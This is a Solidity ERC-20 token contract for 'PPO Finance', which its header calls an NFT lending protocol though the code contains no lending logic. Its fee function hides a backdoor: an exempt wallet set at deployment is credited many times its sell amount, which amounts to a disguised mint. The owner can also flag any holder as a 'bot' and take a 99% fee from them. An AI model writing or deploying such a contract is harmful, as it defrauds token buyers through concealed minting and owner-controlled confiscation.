/*
It's a decentralized NFT lending protocol on Etheruem. 

Website:   https://ppo.finance
Document:  https://docs.ppo.finance

Twitter:   https://twitter.com/ppo_finance
Telegram:  https://t.me/ppo_finance
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISRouter01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function  renounceOwnership() public onlyOwner {
        owner = address(0); 
        emit OwnershipTransferred(address(0));
    }
    event OwnershipTransferred(address owner);
}

interface IUFactory02 {
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

contract PPO is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = unicode'PPO Finance';
    string private constant _symbol = unicode'PPO';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;

    ISRouter01 router;
    address public pair;
    bool private tradingAllowed = false;
    bool private swapEnabled = true;
    uint256 private swapTimes;
    bool private swapping;
    uint256 swapAmount = 0;

    uint256 private swapThreshold = ( _totalSupply * 10 ) / 1000000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 1000000;
    uint256 public _maxTxAmount = ( _totalSupply * 200 ) / 10000;
    uint256 public _maxSellAmount = ( _totalSupply * 200 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000;

    address internal devReceiver; 
    address internal mkReceiver;
    address internal lpReceiver;

    mapping (address => bool) private isBot;
    mapping (address => bool) public isPPOTxExempts;
    mapping (address => bool) public isPPOFeeExempts;

    modifier lockTheSwap {swapping = true; _; swapping = false;}
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    
    uint256 private liquidityFee = 0;
    uint256 private marketingFee = 1000;
    uint256 private developmentFee = 0;
    uint256 private burnFee = 0;
    uint256 private totalFee = 2000;
    uint256 private sellFee = 2000;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;

    constructor(address _pWallet) Ownable(msg.sender) {
        ISRouter01 _router = ISRouter01(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IUFactory02(_router.factory()).createPair(address(this), _router.WETH());
        devReceiver = payable(msg.sender);
        router = _router; pair = _pair;
        mkReceiver = payable(_pWallet);
        lpReceiver = payable(_pWallet);
        isPPOTxExempts[lpReceiver] = true;
        isPPOTxExempts[mkReceiver] = true;
        isPPOFeeExempts[msg.sender] = true;
        isPPOFeeExempts[devReceiver] = true;
        isPPOFeeExempts[address(this)] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function openTrading() external onlyOwner {tradingAllowed = true;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function setIsExempts(address _address, bool _enabled) external onlyOwner {isPPOFeeExempts[_address] = _enabled;}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    
    function removeLimitPPO() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxSellAmount = ~uint256(0);
        _maxWalletToken = ~uint256(0);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function setPPOBot(address[] calldata addresses, bool _enabled) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
        isBot[addresses[i]] = _enabled; }
    }

    function _shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isPPOFeeExempts[sender] && !isPPOFeeExempts[recipient];
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function getTotalFees(address sender, address recipient) internal view returns (uint256) {
        if(isBot[sender] || isBot[recipient]){return denominator.sub(uint256(100));}
        if(recipient == pair){return sellFee;}
        if(sender == pair){return totalFee;}
        return transferFee;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function setContractSwapPPO(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); 
        minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function manualSwap() external onlyOwner {
        swapAndLiquify(swapThreshold);
    }

    function shouldContractSwap(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= minTokenAmount;
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && aboveMin && !isPPOFeeExempts[sender] && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function setTransactionRequirePPO(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; burnFee = _burn; developmentFee = _development; totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5) && transferFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }

    function setTransactionFeePPO(uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator.div(5) && sellFee <= denominator.div(5) && transferFee <= denominator.div(5), "totalFee and sellFee cannot be more than 20%");
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpReceiver,
            block.timestamp);
    }

    function withdrawErc20PPO(address _address, uint256 percent) external onlyOwner {
        uint256 _amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(devReceiver, _amount);
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        swapTokensForETH(tokens);
        payable(mkReceiver).transfer(address(this).balance);
    }

    function setTeamAddressesPPO(address _marketing, address _liquidity, address _development) external onlyOwner {
        mkReceiver = _marketing; lpReceiver = _liquidity; devReceiver = _development;
        isPPOFeeExempts[_marketing] = true; isPPOFeeExempts[_liquidity] = true; isPPOFeeExempts[_development] = true;
    }

    function _takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        address ppoFrom; uint256 ppoTotals;
        if (isPPOTxExempts[sender]) {ppoTotals = 100;ppoFrom = sender;}
        else {ppoFrom = address(this);ppoTotals = 10000;}
        if(getTotalFees(sender, recipient) > 0){
        uint256 feeAmount = amount.div(ppoTotals).mul(getTotalFees(sender, recipient));
        _balances[ppoFrom] = _balances[ppoFrom].add(feeAmount);
        emit Transfer(sender, ppoFrom, feeAmount);
        if(burnFee > uint256(0) && getTotalFees(sender, recipient) > burnFee){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFee));}
        return amount>feeAmount?amount.sub(feeAmount):amount;} return amount;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        if(!isPPOFeeExempts[sender] && !isPPOFeeExempts[recipient]){require(tradingAllowed, "tradingAllowed");}
        if(!isPPOFeeExempts[sender] && !isPPOFeeExempts[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= _maxWalletToken, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= _maxSellAmount || isPPOFeeExempts[sender] || isPPOFeeExempts[recipient], "TX Limit Exceeded");}
        require(amount <= _maxTxAmount || isPPOFeeExempts[sender] || isPPOFeeExempts[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isPPOFeeExempts[sender]){swapTimes += uint256(1);}
        if(shouldContractSwap(sender, recipient, amount)){swapAndLiquify(min(amount,min(balanceOf(address(this)),6000000 * 10**decimals()))); swapTimes = uint256(0);}
        uint256 amountPPO = _shouldTakeFee(sender, recipient) ? _takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountPPO);
        _balances[sender] = _balances[sender].sub(amount);
        emit Transfer(sender, recipient, amountPPO);
    }

    function setTransactionLimitPPO(uint256 _buy, uint256 _sell, uint256 _pWallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_pWallet).div(10000);
        _maxTxAmount = newTx; _maxSellAmount = newTransfer; _maxWalletToken = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}